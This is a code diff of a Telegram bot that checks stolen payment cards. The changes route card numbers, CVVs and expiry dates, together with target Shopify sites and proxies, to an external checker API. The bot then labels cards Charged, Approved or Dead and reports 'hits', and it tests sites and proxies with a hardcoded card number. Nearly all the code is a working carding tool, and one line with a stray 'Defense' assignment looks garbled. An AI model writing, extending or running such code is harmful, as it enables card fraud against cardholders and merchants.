@@ -8,8 +8,9 @@ import time
 import json
 import re
 from datetime import datetime
+
 # Direct API endpoint (replaces checker_bridge)
-CHECKER_API_URL = 'http://62.72.20.10:8081/'
+CHECKER_API_URL = 'https://afuonax.up.railway.app/shopify_parallel'
 
 # Premium Custom Emoji IDs (bot must be created with Telegram Premium account)
 # Use @RawDataBot to get custom_emoji_id for any premium emoji
@@ -120,12 +121,15 @@ def extract_cc(text):
         cards.append(f"{card}|{month}|{year}|{cvv}")
     return cards
 
-def is_dead_site_error(error_msg):
-    """Check if error indicates dead site"""
-    if not error_msg:
+def is_site_dead(response_msg, gateway, price):
+    if not response_msg:
         return True
-    error_lower = str(error_msg).lower()
-    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)
+    if not gateway or gateway == "Unknown":
+        return True
+    price_str = str(price)
+    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
+        return True
+    return False
 
 async def get_bin_info(card_number):
     """Get BIN info from API"""
@@ -158,6 +162,9 @@ async def check_card(card, site, proxy):
         if len(parts) != 4:
             return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
 
+        if not site.startswith('http'):
+            site = f'https://{site}'
+        
         proxy_str = None
         if proxy:
             proxy_parts = proxy.split(':')
@@ -169,50 +176,56 @@ async def check_card(card, site, proxy):
                 proxy_str = f"{ip}:{port}"
             else:
                 proxy_str = proxy
-
-        params = {
-            'cc': card,
-            'url': site,
-            'proxy': proxy_str if proxy_str else proxy
-        }
-        timeout = aiohttp.ClientTimeout(total=120)
+        
+        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
+        if proxy_str:
+            url += f'&proxy={proxy_str}'
+        
+        timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:
-                raw = await resp.json(content_type=None)
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
+                try:
+                    raw = await resp.json()
+                except:
+                    text = await resp.text()
+                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
 
         response_msg = raw.get('Response', '')
         price = raw.get('Price', '-')
-        gate = 'Shopify Payments'
-        status = raw.get('Status', '')
+        if price != '-' and price != 0:
+            price = f"${price}"
+        gateway = raw.get('Gateway', 'Shopify Payments')
 
-        if is_dead_site_error(response_msg):
-            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
+        if is_site_dead(response_msg, gateway, price):
+            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
 
         response_lower = response_msg.lower()
 
-        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
-        elif 'cloudflare bypass failed' in response_lower:
-            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
+        if 'charged' in response_lower or 'order_placed' in response_lower:
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
         elif 'thank you' in response_lower or 'payment successful' in response_lower:
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
-        elif status == 'Approved' or any(key in response_lower for key in [
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
+        elif any(key in response_lower for key in [
             'approved', 'success',
             'insufficient_funds', 'insufficient funds',
             'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
             'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
-            'incorrect_zip', 'incorrect zip'
+            'incorrect_zip', 'incorrect zip', 'cvv issue',
+            '3d', '3d secure', 'otp', 'verification required',
+            'authenticate', 'authentication required', 'challenge required',
+            'redirecting to bank', 'bank verification', 'send code',
+            'enter code', 'verify'
         ]):
-            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
         else:
-            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
 
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
     except Exception as e:
         error_msg = str(e)
-        if is_dead_site_error(error_msg):
-            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
         return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
@@ -265,7 +278,6 @@ async def send_realtime_hit(user_id, result, hit_type, username):
         pass
 
 
-
 async def update_progress(user_id, message_id, results, current_attempt_count):
     """Update progress message with new design"""
     elapsed = int(time.time() - results['start_time'])
@@ -306,7 +318,7 @@ async def send_final_results(user_id, results):
     if results['charged']:
         for r in results['charged'][:5]:
             hits_text += f"✅ <code>{r['card']}</code>\n"
-    if results['approved']:
+    if Defense := results['approved']:
         for r in results['approved'][:5]:
             hits_text += f"🔥 <code>{r['card']}</code>\n"
 
@@ -367,20 +379,46 @@ async def test_site(site, proxy):
     """Test a single site using the direct checker API with a test card"""
     test_card = "5154623245618097|03|2032|156"
     try:
-        params = {'cc': test_card, 'url': site, 'proxy': proxy}
+        if not site.startswith('http'):
+            site = f'https://{site}'
+        
+        proxy_str = None
+        if proxy:
+            proxy_parts = proxy.split(':')
+            if len(proxy_parts) == 4:
+                ip, port, user, password = proxy_parts
+                proxy_str = f"{ip}:{port}:{user}:{password}"
+            elif len(proxy_parts) == 2:
+                ip, port = proxy_parts
+                proxy_str = f"{ip}:{port}"
+        
+        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
+        if proxy_str:
+            url += f'&proxy={proxy_str}'
+        
         timeout = aiohttp.ClientTimeout(total=60)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:
-                raw = await resp.json(content_type=None)
-        response_msg = raw.get('Response', '').lower()
-        if is_dead_site_error(response_msg):
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return {'site': site, 'status': 'dead'}
+                try:
+                    raw = await resp.json()
+                except:
+                    return {'site': site, 'status': 'dead'}
+        
+        response_msg = raw.get('Response', '')
+        gateway = raw.get('Gateway', '')
+        price = raw.get('Price', '-')
+        
+        if is_site_dead(response_msg, gateway, price):
             return {'site': site, 'status': 'dead'}
-        return {'site': site, 'status': 'alive'}
+        else:
+            return {'site': site, 'status': 'alive'}
     except:
         return {'site': site, 'status': 'dead'}
 
 async def test_proxy(proxy):
-    """Test a single proxy using the new direct shopify check logic from file 2"""
+    """Test a single proxy using the direct checker API with a test card and site"""
     try:
         proxy_parts = proxy.split(':')
         if len(proxy_parts) == 4:
